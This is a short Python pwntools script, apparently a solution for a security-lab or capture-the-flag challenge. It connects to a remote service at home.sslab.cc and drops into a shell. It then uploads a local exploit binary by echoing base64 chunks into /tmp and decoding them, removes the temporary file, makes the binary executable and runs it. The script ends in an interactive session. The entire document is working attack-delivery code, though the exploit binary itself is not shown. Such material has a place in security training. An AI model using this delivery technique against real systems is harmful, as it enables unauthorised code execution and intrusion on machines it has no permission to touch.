from pwn import *
import base64

context.log_level = "DEBUG"
p = remote("home.sslab.cc", 45030)
# p = process("./start.sh")

p.recvuntil('/input/input3')
p.sendline('')

p.sendline('ls')

# recv
def recv(p, min=5):
    data = p.recv()
    while len(data) < min:
        data += p.recv()
    return data

def upload(data, path):
    data = base64.b64encode(data)
    length, n = len(data), 0
    while n < length:
        p.sendline('echo ' + data[n: n + 500] + ' >> ' + path + '.b64')
        n += 500
    p.sendline('base64 -d ' + path + '.b64 > ' + path)
    p.sendline('rm -rf ' + path + '.b64')
    sleep(1)

with open("exp", "rb") as f:
    elf = f.read()

path = '/tmp/exp'
upload(elf, '/tmp/exp')


p.sendline('chmod +x ' + path)
p.sendline(path)

p.interactive()
